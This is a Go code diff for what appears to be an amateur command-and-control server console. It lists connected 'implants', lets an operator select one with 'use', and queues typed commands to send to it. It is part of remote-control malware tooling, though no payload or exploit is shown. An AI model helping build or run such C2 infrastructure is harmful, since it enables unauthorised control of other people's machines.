@@ -11,14 +11,18 @@ import (
 
 var pendingCommand string
 var outputDone = make(chan bool)
+var selectedImplant string
 
 func listImplants() {
-	status := "inactive"
-	if implant.Active {
-		status = "active"
+	for _, implant := range implants {
+		status := "inactive"
+		if implant.Active {
+			status = "Active"
+		}
+
+		fmt.Printf("[+] ID:%s Status:%s Last Seen:%s\n", implant.Hostname, status, implant.LastSeen.Format("15:04:05"))
 	}
 
-	fmt.Printf("[+] ID:%s Status:%s Last Seen:%s\n", implant.Hostname, status, implant.LastSeen.Format("15:04:05"))
 }
 func getUserInput() {
 	input := bufio.NewReader(os.Stdin)
@@ -32,19 +36,30 @@ func getUserInput() {
 		}
 
 		command = strings.TrimSpace(command)
-		if command == "implants" {
+		if command == "implants" { // should change to show prefix
 			listImplants()
 			continue
 		}
 
-		pendingCommand = strings.TrimSpace(command)
+		if strings.HasPrefix(command, "use ") {
+			selectedImplant = strings.TrimPrefix(command, "use ")
+			fmt.Println("[*] Selected: ", selectedImplant)
+			continue
+		}
+
+		if selectedImplant == "" {
+			fmt.Println("[!] No implant selected")
+			continue
+		}
+
+		implants[selectedImplant].Command = command
 		<-outputDone // Receving a value from channel i believe
 	}
 }
 
-func sendCommands(conn net.Conn) {
+func sendCommands(conn net.Conn, command string) {
 
-	_, err := conn.Write([]byte(pendingCommand))
+	_, err := conn.Write([]byte(command))
 	if err != nil {
 		log.Println("[-] Error sending command", err)
 		return
